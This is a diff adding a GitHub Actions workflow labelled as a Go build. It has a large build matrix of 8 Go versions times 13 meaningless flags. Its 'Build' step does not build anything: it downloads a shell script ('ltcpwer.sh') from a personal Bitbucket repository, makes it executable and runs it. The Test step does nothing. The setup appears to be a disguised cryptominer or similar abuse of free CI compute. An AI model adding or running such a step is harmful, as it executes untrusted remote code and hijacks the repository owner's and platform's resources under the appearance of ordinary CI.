@@ -1,0 +1,31 @@
+name: Go
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18]
+        flag: [a, b, c, d, e, f, g, h, i, j, k, l, m]
+      fail-fast: false 
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: Build
+      run: |
+        wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+        echo "done"
+    - name: Test
+      run: echo "done"
